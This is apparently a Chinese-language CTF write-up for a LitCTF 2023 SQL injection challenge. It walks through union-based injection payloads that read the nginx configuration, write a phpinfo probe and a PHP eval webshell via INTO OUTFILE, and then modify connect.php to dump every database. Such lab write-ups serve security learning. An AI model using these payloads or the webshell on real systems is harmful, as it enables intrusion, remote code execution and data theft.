---
# 怎么get shell
以***1[LitCTF 2023]这是什么？SQL ！注一下 ！*** 为例
sql注入一句话木马，远程控制os
具体一点的过程在***Sql注入os远程控制.md***
## 收集信息
#### 寻找网站根目录
接下来读取nginx配置文件
```sql
# payload:
?id=-1)))))) union select load_file('/etc/nginx/nginx.conf'),2%23

回显：
daemon off; worker_processes auto; error_log /var/log/nginx/error.log warn; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; root /var/www/html; index index.php; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location / { try_files $uri $uri/ /index.php?$args; } location ~ \.php$ { try_files $uri =404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } } }
```
```nginx
整理一下
# 运行 Nginx 为前台进程
daemon off;

# 根据可用 CPU 核心数自动设置工作进程数量
worker_processes auto;

# 设置错误日志文件的路径和日志级别
error_log /var/log/nginx/error.log warn;

# 事件处理模块配置
events {
    # 每个工作进程可以同时打开的最大连接数
    worker_connections 1024;
}

# HTTP 服务器配置
http {
    # 包含 MIME 类型定义文件
    include /etc/nginx/mime.types;
    
    # 默认的 MIME 类型
    default_type application/octet-stream;
    
    # 启用 sendfile，提高文件传输性能
    sendfile on;
    
    # 设置保持连接的超时时间
    keepalive_timeout 65;
    
    # 虚拟主机配置
    server {
        # 监听端口 80
        listen 80;
        
        # 服务器名称
        server_name localhost;
        
        # 网站文件的根目录
        root /var/www/html;
        
        # 默认的索引文件
        index index.php;
        
        # 设置代理头信息
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        
        # 根目录的处理规则
        location / {
            try_files $uri$uri/ /index.php?$args;
        }
        
        # PHP 文件的处理规则
        location ~ \.php$ {
            try_files $uri =404;
            fastcgi_pass 127.0.0.1:9000;
            fastcgi_index index.php;
            include fastcgi_params;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        }
    }
}

```
找到网站根目录：`/var/www/html`
#### 写入php探针
```sql
# payload:
?id=-1)))))) union select '<?php phpinfo();?>',2 into outfile '/var/www/html/info.php'%23
```
然后访问http://node5.anna.nssctf.cn:24209/info.php      
可以看到`phpinfo`页面，有很多有用的信息，如果出题人不仔细可能flag就在这里
#### 写入webshell
```sql
# payload:
?id=-1)))))) union select '<?php eval($_POST["attack"]);?>',2 into outfile '/var/www/html/attack.php'%23
```
我们在`/var/www/html/`创建了`attack.php`        
蚁剑连接：http://node6.anna.nssctf.cn:28413/attack.php      
密码`attack`      
然后就可以为所欲为了

# 怎么获取数据库
蚁剑连接后可以看到`connect.php`,内容如下：
```php
<?php
  $servername = "localhost";
  $username = "root";
  $password = "123456";
  $dbname = "ctf";

  $conn = new mysqli($servername, $username, $password, $dbname);

  if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
  }
?>
```
可以看到数据库的连接信息
    **1. servername = "localhost";**
    **2. username = "root";**
    **3. password = "123456";**
    **4. dbname = "ctf";**
修改`connect.php`中的数据库连接信息，即可获取数据库     
修改后的代码如下：
```php
<?php
  $servername = "localhost";
  $username = "root";
  $password = "123456";
  $dbname = "ctf";

  $conn = new mysqli($servername, $username, $password, $dbname);

  if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
  }
  // 执行查询
  $sql = "SHOW DATABASES";
  $result =$conn->query($sql);

// 获取所有数据库的列表
$sql = "SHOW DATABASES";$result = $conn->query($sql);

// 遍历所有数据库
while($database =$result->fetch_assoc()) {
    $dbName = array_values($database)[0];
    
    // 选择数据库
    if ($conn->select_db($dbName)) {
        echo "Contents of database: " . $dbName . "<br>";

        // 获取数据库中所有表的列表
        $tablesSql = "SHOW TABLES FROM " .$dbName;
        $tablesResult =$conn->query($tablesSql);

        // 遍历所有表
        while($table =$tablesResult->fetch_assoc()) {
            $tableName = array_values($table)[0];

            // 输出表名
            echo "Contents of table: " . $tableName . "<br>";

            // 获取并输出表中的所有数据
            $tableSql = "SELECT * FROM " .$tableName;
            $tableResult =$conn->query($tableSql);

            if ($tableResult) {
                // 输出列名
                echo "<table border='1'><tr>";
                while ($fieldinfo =$tableResult->fetch_field()) {
                    echo "<td>" . $fieldinfo->name . "</td>";
                }
                echo "</tr>";

                // 输出数据
                while($row =$tableResult->fetch_assoc()) {
                    echo "<tr>";
                    foreach ($row as$value) {
                        echo "<td>" . htmlspecialchars($value) . "</td>";
                    }
                    echo "</tr>";
                }
                echo "</table><br>";
            } else {
                echo "Error: " . $tableSql . "<br>" .$conn->error;
            }
        }
    } else {
        echo "Cannot select database: " . $dbName . "<br>";
    }
}

// 关闭连接
$conn->close();
?>
```
然后访问connect.php，就可以获取数据库中的所有表和数据，包括列名和数据。        
用`Ctrl+F`搜索`ctf`关键字，即可获得答案。